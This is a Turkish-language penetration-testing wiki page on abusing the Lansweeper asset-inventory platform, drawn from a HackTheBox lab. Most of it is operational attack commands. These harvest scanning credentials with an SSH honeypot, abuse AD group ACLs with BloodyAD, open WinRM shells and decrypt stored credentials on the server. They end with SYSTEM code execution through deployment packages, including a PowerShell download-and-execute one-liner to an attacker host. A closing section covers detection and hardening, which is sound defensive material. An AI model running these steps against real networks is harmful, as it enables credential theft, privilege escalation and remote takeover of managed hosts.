# Lansweeper Abuse: Credential Harvesting, Secrets Decryption ve Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper, genellikle Windows üzerinde dağıtılan ve Active Directory ile entegre edilen bir IT varlık keşfi ve envanter platformudur. Lansweeper'da yapılandırılan credentials, scanning engine'leri tarafından SSH, SMB/WMI ve WinRM gibi protokoller üzerinden varlıklara kimlik doğrulaması yapmak için kullanılır. Yanlış yapılandırmalar sıklıkla şunlara olanak sağlar:

- Bir scanning target'ı attacker-controlled bir host'a (honeypot) yönlendirerek credential interception
- Lansweeper ile ilişkili grupların açığa çıkardığı AD ACL'lerini abuse ederek remote access elde etme
- Lansweeper'da yapılandırılmış secrets'ları (connection strings ve stored scanning credentials) host üzerinde decrypt etme
- Deployment özelliği aracılığıyla managed endpoint'lerde code execution (çoğunlukla SYSTEM olarak çalışır)

Bu sayfa, engagement'lar sırasında bu davranışları abuse etmeye yönelik pratik attacker workflow'larını ve command'leri özetler.

## 1) Honeypot ile scanning credentials harvesting (SSH example)

Fikir: Sizin host'unuzu gösteren bir Scanning Target oluşturun ve mevcut Scanning Credentials'ları bu target'a map edin. Scan çalıştığında Lansweeper bu credentials ile authenticate olmaya çalışır ve honeypot'unuz bunları capture eder.<sup>[[1]](#references)</sup>

Adımların özeti (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (veya Single IP) = VPN IP'niz
- Ulaşılabilir bir SSH port'u yapılandırın (ör. 22 engelliyse 2022)
- Schedule'ı devre dışı bırakın ve manuel olarak trigger etmeyi planlayın
- Scanning → Scanning Credentials → Linux/SSH credentials'ın mevcut olduğundan emin olun; bunları yeni target'a map edin (gerektiğinde tümünü enable edin)
- Target üzerinde “Scan now” seçeneğine tıklayın
- Bir SSH honeypot çalıştırın ve denenen username/password'ü alın

sshesame ile örnek:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Yakalanan kimlik bilgilerini DC hizmetlerine karşı doğrulayın:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notlar
- Scanner'ı listener'ınıza yönlendirebildiğiniz diğer protocol'lerde de benzer şekilde çalışır (SMB/WinRM honeypot'ları vb.). SSH genellikle en basit seçenektir.
- Birçok scanner kendisini belirgin client banner'larıyla (ör. RebexSSH) tanıtır ve benign komutları (uname, whoami vb.) çalıştırmayı dener.

## 2) AD ACL abuse: kendinizi bir app-admin grubuna ekleyerek remote access elde etme

Compromised account üzerinden effective rights'ı enumerate etmek için BloodHound kullanın. Yaygın bir bulgu, scanner'a veya app'e özel bir grubun (ör. “Lansweeper Discovery”) privileged bir grup (ör. “Lansweeper Admins”) üzerinde GenericAll hakkına sahip olmasıdır. Privileged grup aynı zamanda “Remote Management Users” grubunun da üyesiyse, kendimizi eklediğimizde WinRM kullanılabilir hale gelir.<sup>[[1]](#references)[[5]](#references)</sup>

Collection örnekleri:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD ile grup üzerindeki GenericAll yetkisini Exploit et (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Ardından etkileşimli bir shell elde edin:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
İpucu: Kerberos işlemleri zamana duyarlıdır. KRB_AP_ERR_SKEW hatası alırsanız önce DC ile senkronize olun:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Host üzerindeki Lansweeper-configured secrets'ı Decrypt et

Lansweeper sunucusunda ASP.NET sitesi genellikle application tarafından kullanılan şifrelenmiş bir connection string ve symmetric key saklar. Uygun local access ile DB connection string'i decrypt edebilir ve ardından saklanan scanning credentials'ları extract edebilirsiniz.<sup>[[1]](#references)</sup>

Tipik konumlar:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Saklanan creds'leri decrypt edip dump işlemini otomatikleştirmek için SharpLansweeperDecrypt kullanın:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Beklenen çıktı, DB bağlantı ayrıntılarını ve ortam genelinde kullanılan Windows ve Linux hesapları gibi plaintext tarama kimlik bilgilerini içerir. Bunlar genellikle domain host'larında yükseltilmiş yerel yetkilere sahiptir:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Kurtarılan Windows tarama kimlik bilgilerini ayrıcalıklı erişim için kullanın:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins” üyesi olarak web UI, Deployment ve Configuration bölümlerini kullanıma açar. Deployment → Deployment packages altında, hedeflenen asset'lerde rastgele komutlar çalıştıran paketler oluşturabilirsiniz. Çalıştırma, yüksek ayrıcalıklarla Lansweeper service tarafından gerçekleştirilir ve seçilen host üzerinde NT AUTHORITY\SYSTEM olarak code execution elde edilir.<sup>[[1]](#references)</sup>

Üst düzey adımlar:
- PowerShell veya cmd one-liner'ı (reverse shell, add-user vb.) çalıştıran yeni bir Deployment paketi oluşturun.
- İstediğiniz asset'i (ör. Lansweeper'ın çalıştığı DC/host) hedefleyin ve Deploy/Run now seçeneğine tıklayın.
- Shell'inizi SYSTEM olarak alın.

Örnek payload'lar (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment işlemleri gürültülüdür ve Lansweeper ile Windows event log'larında kayıt bırakır. Dikkatli ve gerektiği kadar kullanın.

## Tespit ve hardening

- Anonim SMB enumeration işlemlerini kısıtlayın veya kaldırın. RID cycling ve Lansweeper share'lerine anormal erişimleri izleyin.
- Egress kontrolleri: scanner host'larından yapılan dışarı yönlü SSH/SMB/WinRM bağlantılarını engelleyin veya sıkı şekilde kısıtlayın. Standart olmayan portlar (ör. 2022) ve Rebex gibi alışılmadık client banner'ları için alert oluşturun.
- `Website\\web.config` ve `Key\\Encryption.txt` dosyalarını koruyun. Secret'ları bir vault'a taşıyın ve exposure durumunda rotate edin. Minimum ayrıcalıklara sahip service account'larını ve mümkün olduğunda gMSA kullanmayı değerlendirin.
- AD monitoring: Lansweeper ile ilgili gruplardaki (ör. “Lansweeper Admins”, “Remote Management Users”) değişiklikler ve ayrıcalıklı gruplara GenericAll/Write membership veren ACL değişiklikleri için alert oluşturun.
- Deployment package oluşturma/değiştirme/çalıştırma işlemlerini audit edin; cmd.exe/powershell.exe başlatan veya beklenmeyen dış bağlantılar oluşturan package'ler için alert oluşturun.

## İlgili konular
- SMB/LSA/SAMR enumeration ve RID cycling
- Kerberos password spraying ve clock skew hususları
- Application-admin gruplarının BloodHound path analysis işlemleri
- WinRM kullanımı ve lateral movement

## Referanslar
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
